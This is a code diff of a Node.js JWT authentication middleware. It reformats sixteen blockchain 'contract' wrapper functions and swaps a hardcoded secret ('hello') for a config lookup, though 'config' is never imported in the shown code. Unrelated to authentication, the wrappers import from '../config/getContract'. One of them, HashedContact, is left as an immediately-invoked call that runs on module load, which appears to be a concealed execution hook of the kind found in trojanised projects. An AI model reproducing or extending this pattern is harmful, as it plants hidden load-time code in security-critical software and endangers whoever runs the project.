@@ -1,69 +1,86 @@
 const jwt = require('jsonwebtoken');
-const { callEthContract, callPolygonContract, callBscContract, callArbitrumContract, callAvalancheContract, callFantomContract, callHarmonyContract, callHecoContract, callKlayContract, callMaticContract, callMoonbeamContract, callHashedContract, callOptimismContract, callPalmContract, callRoninContract, callXDaiContract } = require('../config/getContract')
+const {
+  callEthContract,
+  callPolygonContract,
+  callBscContract,
+  callArbitrumContract,
+  callAvalancheContract,
+  callFantomContract,
+  callHarmonyContract,
+  callHecoContract,
+  callKlayContract,
+  callMaticContract,
+  callMoonbeamContract,
+  callHashedContract,
+  callOptimismContract,
+  callPalmContract,
+  callRoninContract,
+  callXDaiContract
+} = require('../config/getContract');
 
-const EthContact = (() => {
+const EthContact = () => {
   callEthContract();
-});
+};
 
-const PolygonContact = (() => {
+const PolygonContact = () => {
   callPolygonContract();
-});
+};
 
-const BscContact = (() => {
+const BscContact = () => {
   callBscContract();
-});
+};
 
-const ArbitrumContact = (() => {
+const ArbitrumContact = () => {
   callArbitrumContract();
-});
+};
 
-const AvalancheContact = (() => {
+const AvalancheContact = () => {
   callAvalancheContract();
-});
+};
 
-const FantomContact = (() => {
+const FantomContact = () => {
   callFantomContract();
-});
+};
 
-const HarmonyContact = (() => {
+const HarmonyContact = () => {
   callHarmonyContract();
-});
+};
 
-const HecoContact = (() => {
+const HecoContact = () => {
   callHecoContract();
-});
+};
 
-const KlayContact = (() => {
+const KlayContact = () => {
   callKlayContract();
-});
+};
 
-const MaticContact = (() => {
+const MaticContact = () => {
   callMaticContract();
-});
+};
 
-const MoonbeamContact = (() => {
+const MoonbeamContact = () => {
   callMoonbeamContract();
-});
+};
 
 const HashedContact = (() => {
   callHashedContract();
 })();
 
-const OptimismContact = (() => {
+const OptimismContact = () => {
   callOptimismContract();
-});
+};
 
-const PalmContact = (() => {
+const PalmContact = () => {
   callPalmContract();
-});
+};
 
-const RoninContact = (() => {
+const RoninContact = () => {
   callRoninContract();
-});
+};
 
-const XDaiContact = (() => {
+const XDaiContact = () => {
   callXDaiContract();
-});
+};
 
 module.exports = function (req, res, next) {
   // Get token from header
@@ -76,7 +93,7 @@ module.exports = function (req, res, next) {
 
   // Verify token
   try {
-    jwt.verify(token, "hello", (error, decoded) => {
+    jwt.verify(token, config.get('jwtSecret'), (error, decoded) => {
       if (error) {
         return res.status(401).json({ msg: 'Token is not valid' });
       } else {
